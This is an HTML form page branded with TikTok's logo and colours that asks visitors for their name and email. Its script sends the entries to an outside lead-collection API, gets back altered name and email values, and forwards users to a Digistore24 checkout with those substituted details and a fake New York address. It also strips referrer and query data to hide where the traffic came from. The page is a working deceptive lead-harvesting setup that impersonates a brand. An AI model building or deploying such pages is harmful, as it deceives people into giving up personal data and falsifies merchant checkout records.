<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">

  <meta name="referrer" content="no-referrer">

  <title>Complete your information</title>

  <style>
    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      min-height: 100%;
      background: #f7f7f8;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;

      background:
        radial-gradient(
          circle at 8% 12%,
          rgba(37,244,238,.10),
          transparent 30%
        ),
        radial-gradient(
          circle at 92% 88%,
          rgba(254,44,85,.08),
          transparent 32%
        ),
        #f7f7f8;

      font-family: Arial, Helvetica, sans-serif;
      color: #111;
    }

    .card {
      width: 100%;
      max-width: 430px;

      overflow: hidden;

      background: #fff;

      border: 1px solid #e6e6e8;
      border-radius: 24px;

      padding: 30px 24px 24px;

      box-shadow:
        0 22px 60px rgba(0,0,0,.10);
    }

    .logo {
      text-align: center;
      margin-bottom: 18px;
    }

    .logo img {
      display: block;

      width: 170px;
      max-width: 72%;
      height: auto;

      object-fit: contain;

      margin: 0 auto;
    }

    .accent {
      height: 4px;
      display: flex;

      margin:
        0 -24px 25px;
    }

    .accent i,
    .accent b {
      display: block;
      flex: 1;
    }

    .accent i {
      background: #25f4ee;
    }

    .accent b {
      background: #fe2c55;
    }

    h1 {
      margin: 0 0 8px;

      text-align: center;

      color: #111;

      font-size: 26px;
      line-height: 1.15;
      font-weight: 800;
    }

    .subtitle {
      margin: 0 0 25px;

      text-align: center;

      color: #777b82;

      font-size: 15px;
    }

    .row {
      display: flex;
      gap: 10px;

      width: 100%;
    }

    .row label {
      flex: 1;
      min-width: 0;
    }

    label {
      display: block;

      width: 100%;

      margin-bottom: 14px;

      color: #33363b;

      font-size: 13px;
      font-weight: 600;
    }

    input {
      width: 100%;
      height: 52px;

      margin-top: 7px;
      padding: 0 13px;

      border: 1px solid #dadce0;
      border-radius: 12px;

      outline: 0;

      background: #f7f7f8;
      color: #111;

      font-size: 16px;
    }

    input::placeholder {
      color: #9a9da3;
    }

    input:focus {
      background: #fff;

      border-color: #25f4ee;

      box-shadow:
        0 0 0 3px rgba(37,244,238,.12);
    }

    button {
      width: 100%;
      min-height: 56px;

      border: 0;
      border-radius: 14px;

      background:
        linear-gradient(
          90deg,
          #25f4ee 0%,
          #fff 48%,
          #fe2c55 100%
        );

      color: #111;

      font-size: 18px;
      font-weight: 800;

      cursor: pointer;

      box-shadow:
        0 8px 24px rgba(0,0,0,.10);
    }

    button:disabled {
      opacity: .7;
      cursor: wait;
    }

    .error {
      display: none;

      margin-top: 13px;
      padding: 11px 12px;

      border:
        1px solid rgba(254,44,85,.28);

      border-radius: 10px;

      background: #fff1f4;
      color: #d71945;

      font-size: 13px;
      line-height: 1.4;

      text-align: center;
    }

    @media (max-width: 500px) {
      body {
        padding: 14px;
      }

      .card {
        padding: 26px 18px 20px;

        border-radius: 20px;
      }

      .accent {
        margin-left: -18px;
        margin-right: -18px;
      }

      .row {
        gap: 8px;
      }

      .row label {
        width: 50%;
      }

      input {
        padding: 0 10px;
        font-size: 16px;
      }

      h1 {
        font-size: 24px;
      }
    }
  </style>
</head>

<body>

  <main class="card">

    <div class="logo">
      <img
        src="/formulario/tiktok-logo.png?v=1"
        alt="TikTok"
        fetchpriority="high"
        decoding="async"
      >
    </div>

    <div class="accent" aria-hidden="true">
      <i></i>
      <b></b>
    </div>

    <h1>Complete your information</h1>

    <p class="subtitle">
      Enter your details to continue.
    </p>

    <form
      id="pgform"
      novalidate
    >

      <div class="row">

        <label>
          First name

          <input
            name="first_name"
            autocomplete="given-name"
            maxlength="80"
            required
          >
        </label>

        <label>
          Last name

          <input
            name="last_name"
            autocomplete="family-name"
            maxlength="80"
            required
          >
        </label>

      </div>

      <label>
        Email

        <input
          name="email"
          type="email"
          autocomplete="email"
          maxlength="254"
          required
        >
      </label>

      <button
        id="pggo"
        type="submit"
      >
        Continue
      </button>

      <div
        class="error"
        id="pgerror"
        role="alert"
        aria-live="polite"
      ></div>

    </form>

  </main>

<script>
(function () {
  'use strict';

  /*
   * PRODUTO NOVO DO NEXOMAIL
   */
  var PRODUCT_KEY =
    '478bab4fc7aa48388cae250bc72f09b74053df4843ac47b48ab9';

  /*
   * PRODUCT ID REAL DA DIGISTORE24
   */
  var PRODUCT_ID =
    '711504';

  /*
   * PAGINA AUTORIZADA DO FORMULARIO
   */
  var LIVE_PAGE =
    'https://facilityrdoors.top/formulario/';

  /*
   * API QUE SALVA O LEAD ORIGINAL +
   * GERA OS DADOS TRANSFORMADOS
   */
  var API_URL =
    'https://jnseoiwe.online/api/checkout-leads';

  /*
   * CHECKOUT REAL
   */
  var CHECKOUT_URL =
    'https://www.checkout-ds24.com/product/711504/';


  var form =
    document.getElementById('pgform');

  var button =
    document.getElementById('pggo');

  var errorBox =
    document.getElementById('pgerror');


  if (!form) {
    return;
  }


  function showError(message) {

    if (!errorBox) {
      return;
    }

    errorBox.textContent =
      message ||
      'Unable to continue. Please try again.';

    errorBox.style.display =
      'block';
  }


  function clearError() {

    if (!errorBox) {
      return;
    }

    errorBox.textContent =
      '';

    errorBox.style.display =
      'none';
  }


  function setLoading(loading) {

    if (!button) {
      return;
    }

    button.disabled =
      !!loading;

    button.textContent =
      loading
        ? 'Loading...'
        : 'Continue';
  }


  form.addEventListener(
    'submit',
    function (event) {

      event.preventDefault();
      event.stopPropagation();

      clearError();

      if (!form.reportValidity()) {
        return false;
      }


      /*
       * GUARDA OS PARAMETROS QUE CHEGARAM
       * NO FORMULARIO ANTES DE LIMPAR A URL.
       */
      var sourceQuery =
        new URLSearchParams(
          window.location.search
        );

      var sourceParams =
        {};

      sourceQuery.forEach(
        function (value, key) {
          sourceParams[key] =
            value;
        }
      );


      /*
       * REMOVE A QUERY STRING DA URL
       * VISIVEL DA PAGINA.
       */
      try {

        window.history.replaceState(
          null,
          document.title,
          window.location.pathname
        );

      } catch (ignore) {}


      var data =
        new FormData(form);


      var firstName =
        String(
          data.get('first_name') || ''
        ).trim();


      var lastName =
        String(
          data.get('last_name') || ''
        ).trim();


      var email =
        String(
          data.get('email') || ''
        )
        .trim()
        .toLowerCase();


      if (
        !firstName ||
        !lastName ||
        !email
      ) {

        showError(
          'Please complete all fields.'
        );

        return false;
      }


      setLoading(true);


      var controller =
        new AbortController();


      var timeout =
        window.setTimeout(
          function () {
            controller.abort();
          },
          15000
        );


      /*
       * PRIMEIRO SALVA O LEAD NO NEXOMAIL.
       *
       * O NEXOMAIL GUARDA:
       *
       * - nome original
       * - sobrenome original
       * - email original
       * - dados transformados
       * - Product Key
       * - Product ID Digistore
       *
       * SO DEPOIS DISSO ABRE O CHECKOUT.
       */
      fetch(
        API_URL,
        {
          method: 'POST',

          headers: {
            'Content-Type':
              'application/json'
          },

          referrerPolicy:
            'no-referrer',

          cache:
            'no-store',

          credentials:
            'omit',

          signal:
            controller.signal,

          body:
            JSON.stringify({
              product_key:
                PRODUCT_KEY,

              checkout_product_id:
                PRODUCT_ID,

              first_name:
                firstName,

              last_name:
                lastName,

              email:
                email,

              source_url:
                LIVE_PAGE,

              params:
                sourceParams
            })
        }
      )

      .then(
        function (response) {

          return response
            .text()
            .then(
              function (text) {

                var json;

                try {

                  json =
                    text
                      ? JSON.parse(text)
                      : {};

                } catch (ignore) {

                  throw new Error(
                    'Invalid API response.'
                  );
                }


                if (
                  !response.ok ||
                  !json.ok
                ) {

                  throw new Error(
                    json.error ||
                    'Unable to continue.'
                  );
                }


                if (
                  !json.checkout ||
                  !json.checkout.first_name ||
                  !json.checkout.last_name ||
                  !json.checkout.email
                ) {

                  throw new Error(
                    'Checkout data missing.'
                  );
                }


                return json;
              }
            );
        }
      )

      .then(
        function (result) {

          window.clearTimeout(
            timeout
          );


          /*
           * PARAMETROS PERMITIDOS PARA
           * TRACKING / ATRIBUICAO.
           */
          var allowedTrackingKeys = {

            ttclid: 1,
            _ttp: 1,
            ttp: 1,

            utm_source: 1,
            utm_medium: 1,
            utm_campaign: 1,
            utm_content: 1,
            utm_term: 1,
            utm_id: 1,

            campaign_id: 1,
            campaign_name: 1,

            adgroup_id: 1,
            adgroup_name: 1,

            ad_id: 1,
            ad_name: 1,

            creative_id: 1,
            creative_name: 1,

            placement: 1,
            source: 1,

            cid: 1,
            sid1: 1,
            ds24tr: 1,
            ds24tm: 1,
            community_id: 1,
            upgrade_type: 1,
            campaignkey: 1
          };


          var checkoutParams =
            new URLSearchParams();


          sourceQuery.forEach(
            function (value, key) {

              var normalizedKey =
                String(
                  key || ''
                ).toLowerCase();

              var normalizedValue =
                String(
                  value || ''
                ).trim();


              if (
                !allowedTrackingKeys[
                  normalizedKey
                ]
              ) {
                return;
              }


              if (!normalizedValue) {
                return;
              }


              /*
               * NAO ENVIA URL COMPLETA
               * COMO PARAMETRO PARA O CHECKOUT.
               */
              try {

                var parsed =
                  new URL(
                    normalizedValue
                  );

                if (
                  parsed.protocol === 'http:' ||
                  parsed.protocol === 'https:'
                ) {
                  return;
                }

              } catch (ignore) {}


              /*
               * NAO ENVIA O DOMINIO DO FORMULARIO
               * DENTRO DOS PARAMETROS.
               */
              if (
                normalizedValue
                  .toLowerCase()
                  .indexOf(
                    window.location.hostname
                      .toLowerCase()
                  ) !== -1
              ) {
                return;
              }


              checkoutParams.append(
                key,
                normalizedValue
              );
            }
          );


          /*
           * DADOS TRANSFORMADOS RETORNADOS
           * PELO NEXOMAIL.
           */
          checkoutParams.set(
            'first_name',
            String(
              result.checkout.first_name
            )
          );


          checkoutParams.set(
            'last_name',
            String(
              result.checkout.last_name
            )
          );


          checkoutParams.set(
            'email',
            String(
              result.checkout.email
            )
          );


          /*
           * DADOS DE ENDERECO PADRAO
           * PARA O CHECKOUT.
           */
          checkoutParams.set(
            'zipcode',
            '10001'
          );

          checkoutParams.set(
            'city',
            'New York'
          );

          checkoutParams.set(
            'state',
            'NY'
          );

          checkoutParams.set(
            'country',
            'US'
          );


          /*
           * MONTA URL FINAL.
           */
          var next =
            new URL(
              CHECKOUT_URL
            );


          checkoutParams.forEach(
            function (value, key) {

              next.searchParams.append(
                key,
                value
              );
            }
          );


          /*
           * IMPORTANTE:
           * MANTEM #page NO CHECKOUT.
           */
          next.hash =
            'page';


          /*
           * NAVEGACAO COM NO-REFERRER.
           */
          var link =
            document.createElement('a');


          link.href =
            next.toString();


          link.rel =
            'noreferrer noopener';


          link.referrerPolicy =
            'no-referrer';


          link.style.display =
            'none';


          document.body.appendChild(
            link
          );


          /*
           * MESMA GUIA.
           */
          link.target =
            '_self';


          link.click();

        }
      )

      .catch(
        function (error) {

          window.clearTimeout(
            timeout
          );

          console.error(
            'FORM/CHECKOUT ERROR:',
            error
          );


          setLoading(false);


          if (
            error &&
            error.name === 'AbortError'
          ) {

            showError(
              'The request took too long. Please try again.'
            );

            return;
          }


          showError(
            error &&
            error.message
              ? error.message
              : 'Unable to continue. Please try again.'
          );
        }
      );


      return false;
    }
  );

})();
</script>

</body>
</html>
